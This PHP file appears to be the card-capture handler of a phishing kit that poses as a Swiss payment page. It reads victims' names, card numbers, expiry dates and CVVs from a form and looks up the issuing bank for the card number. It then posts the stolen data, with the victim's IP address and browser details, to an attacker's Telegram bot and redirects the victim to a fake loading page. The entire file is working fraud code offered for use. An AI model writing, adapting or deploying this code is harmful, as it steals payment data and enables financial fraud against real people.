<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/



include '../bak3r.php';


session_start();

// Get the current URL including the directory
$currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

// Extract the root directory (base URL)
$baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";

// Get the path up to the main directory (removing subdirectories)
$scriptName = explode('/', trim($_SERVER['SCRIPT_NAME'], '/'));
$mainDir = isset($scriptName[0]) ? $scriptName[0] : '';
$baseDir = $baseUrl . '/' . $mainDir . '/';

// Get the user's IP address
$userIp = ($_SERVER['REMOTE_ADDR'] === '::1') ? '127.0.0.1' : $_SERVER['REMOTE_ADDR'];

// Construct the new URL
$panel = $baseDir . "control-panel.php?ip=" . $userIp;


$name = $_POST['name'];
$cardNumber = $_POST['ccnumber'];
$date = $_POST['ccexp'];
$cvv = $_POST['cvv'];



$cardNumber = str_replace(' ', '', $cardNumber); // Remove any spaces
$bin = substr($cardNumber, 0, 6);

// Initialize defaults
$bin_bank = "Unknown bank";
$bin_type = "Unknown type";
$bin_brand = "Unknown brand";
$bank_logo = "./media/flag.png"; // Generic logo

// Swiss bank logos
$swiss_banks = [
    "UBS" => "./media/ubs.png",
    "Credit Suisse" => "./media/credit_suisse.png",
    "Raiffeisen" => "./media/raiffeisen.png",
    "PostFinance" => "./media/postfinance.png",
    "Zürcher Kantonalbank" => "./media/zurich_kb.png",
    "Banque Cantonale Vaudoise" => "./media/bcv.png",
    "Banque Cantonale de Genève" => "./media/bcg.png",
    "Basler Kantonalbank" => "./media/basler_kb.png",
    "Luzerner Kantonalbank" => "./media/luzerner_kb.png",
    "St. Galler Kantonalbank" => "./media/st_galler_kb.png",
    "Thurgauer Kantonalbank" => "./media/thurgauer_kb.png",
    "Berner Kantonalbank" => "./media/berner_kb.png",
    "Aargauische Kantonalbank" => "./media/aargauische_kb.png",
    "Schwyzer Kantonalbank" => "./media/schwyzer_kb.png",
    "Glarner Kantonalbank" => "./media/glarner_kb.png",
    "Valiant Bank" => "./media/valiant.png",
    "Migros Bank" => "./media/migros_bank.png",
    "Bank Cler" => "./media/bank_cler.png",
    "Cornèr Bank" => "./media/corner_bank.png",
    "Julius Baer" => "./media/julius_baer.png",
    "Pictet" => "./media/pictet.png",
    "Vontobel" => "./media/vontobel.png",
    "Hypothekarbank Lenzburg" => "./media/hypothekarbank_lenzburg.png",
    "Banque Cantonale Neuchâteloise" => "./media/bcn.png",
];

// Use Binlist API
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $bin);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Version: 3'));

$response = curl_exec($ch);
curl_close($ch);

if ($response) {
    $data = json_decode($response);

    $bin_bank = $data->bank->name ?? $bin_bank;
    $bin_type = $data->type ?? $bin_type;
    $bin_brand = $data->brand ?? $bin_brand;

    // Match Swiss bank logo if applicable
    foreach ($swiss_banks as $bank_name => $logo_path) {
        if (stripos($bin_bank, $bank_name) !== false) {
            $bank_logo = $logo_path;
            break;
        }
    }
}

if (substr($cardNumber, 0, 1) == '4') {
    $card_type = 'visa';
} elseif (substr($cardNumber, 0, 1) == '5') {
    $card_type = 'mastercard';
} elseif (substr($cardNumber, 0, 1) == '3') {
    $card_type = 'amex';
} else {
    $card_type = 'unknown';
}

// Store details in session
$_SESSION['cardNumber'] = $cardNumber;
$_SESSION['bank_logo'] = $bank_logo;
$_SESSION['bin_bank'] = $bin_bank;
$_SESSION['bin_type'] = $bin_type;
$_SESSION['bin_brand'] = $bin_brand;
$_SESSION['card_type'] = $card_type;

$messages = "ㅤㅤㅤ[🔥] 𝑺𝒘𝒊𝒔𝒔𝑷𝒂𝒔𝒔 𝕭𝖞 @Kachtas [🔥] ㅤㅤㅤ\n\n🔍𝑵𝒂𝒎𝒆:$name\n💳𝑪𝒂𝒓𝒅 𝑵𝒖𝒎𝒃𝒆𝒓: $cardNumber\n💳𝑫𝒂𝒕𝒆: $date\n💳𝑪𝑽𝑽: $cvv\n\n🏴‍☠️𝑷𝒂𝒏𝒆𝒍: $panel\n\n🍓 Banque : " . $bin_bank . "\n🍓 Niveau de la carte : " . $bin_brand . "\n🍓 Type de carte : " . $bin_type . "\n\n🗑𝓐𝓭𝓻𝓮𝓼𝓼𝓮 𝓘𝓟 : " . $_SERVER['REMOTE_ADDR'] . "\n🛒𝑼𝒔𝒆𝒓 𝑨𝒈𝒆𝒏𝒕 : " . $_SERVER['HTTP_USER_AGENT'] . "";

$data = array(
    'chat_id' => $chatid,
    'text' => $messages
);

$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents("https://api.telegram.org/bot$token/sendMessage", false, $context);


header("Location: ../loading.php");